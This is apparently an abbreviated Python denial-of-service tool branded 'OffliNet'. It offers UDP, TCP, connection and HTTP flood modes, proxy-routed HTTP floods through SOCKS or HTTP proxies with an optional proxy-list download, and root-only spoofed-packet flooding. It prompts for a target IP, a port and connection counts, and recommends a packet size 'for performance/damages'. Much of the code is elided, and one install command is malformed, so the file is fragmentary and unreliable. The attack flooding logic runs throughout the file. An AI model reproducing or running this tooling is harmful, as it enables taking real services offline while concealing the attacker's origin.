import random, sys, threading, time, urllib.request, os, platform
...
try:
    ...
    if sys.platform =="linux":
        ...
        if distro() == "ubuntu":
            pip= int(input('Do you have pip module?(1=Yes, 2=No, 3= What is this?,4 = autodetection):'))
            if pip==1:
                pass
            if pip==2:
                os.system('apt-get install python3-pip')
            if pip==3:
                print("pip is a package management system used to install and manage software packages written in Python") 
            if pip==4:
                try:
                    import pip
                except:
        ...
        if distro() == "OpenSUSE":
            ...
            print("This distro not support pip autodownloader install yourself with a command like 'sudo (thepacketinstallcommand) install python3-pip' or something simile")
...
try:
    ...
    if sys.platform =="linux":
        ...
        os.system('py -m install colorama, termcolor')
...
print(colored("@@@@#     #  #      #      #      #   #    #  #         #   @@@@", "blue", "on_green"))
print(colored("@@@@#######  #      #      #####  #   #    #  #####     #   @@@@", "blue", "on_green"))
print(colored("§§§§§§§§§§§§§§§§§§§§§§§CODED BY SCRIPTMAN§§§§§§§§§§§§§§§§§§§§§§§", "blue", "on_green"))
print(colored("§§§§§§https://www.inforge.net/xi/members/scriptman.240778/§§§§§§", "blue", "on_green"))

Method = __name__

if sys.platform =="linux":                                                                                                                                                                               #r.i.p print ('If you saw some errors up of this message about tcpdump and IPV6 do not worry about it these will not improve the performance or the running of OffliNet')

    print ('Remember you must run this program as root for spoofed flood packed')
    
    Method=int(input('DoS Mode (1=UDP Flood, 2= Connections Flood, 3=HTTP Flood, 4= HTTP Proxed Flood(Socks Proxy), 5= HTTP Proxed Flood(HTTP Proxy),6= TCP Flood, 7= Spoofed Packed Flooder):'))

else:
    
    print ('I am sorry but in this OS spoofed packed flood is not enabled')
    Method=int(input('DoS Mode (1=UDP Flood, 2= Connections Flood, 3=HTTP Flood, 4= HTTP Proxed Flood(Socks Proxy), 5= HTTP Proxed Flood(HTTP Proxy), 6= TCP Flood):'))
...
if Method == 1:
    ...
    size=int(input('Packet Size(best size for performance/damages is 2000):'))
...
if Method == 2:
    ...
    print ("Connections Flood:")
    ip = input('Target ip: ')
    port = int(input('Target port: '))
    number = int(input('Number of Connections: '))
...
if Method == 4:
    ...
    plist = int(input('Do you want to download a proxylist?(1=Yes, 2=No):'))
    if plist == 1:
    ...
    if plist == 0:
        pass
    print ("HTTP Flood proxed (Socks proxy mode):")
    url= input("Target Ip:")
    host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
        ...
        def run(self):
            ...
            while True:
                ...
                try:
                    ...
                    socks = socks.socksocket()
                    socks.connect((str(url) , int(urlport)))
                    socks.send(str.encode(request))
                    print ("Http Request Sent!")
                except:
...
if Method == 5:
    ...
    print ("HTTP Flood proxed (Http proxy mode):")
    url= input("Target Ip:")
    host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
    out_file = str(input("Enter the proxylist filename(standard is:proxy.txt): "))
    if out_file== "":
        ...
        def run(self):
            ...
            while True:
                try:
                    ...
                    socks.connect((str(proxy[0]), int(proxy[1])))
                    socks.send(str.encode(request))
                    print ("Http Request Sent!") 
                except:
                    pass
...
if Method == 7:
    ...
    if sys.platform =="linux":
        if os.getuid() != 0:
            ...
            print("This is an obsolete method so some ISP blocks it but there is no harm in trying")
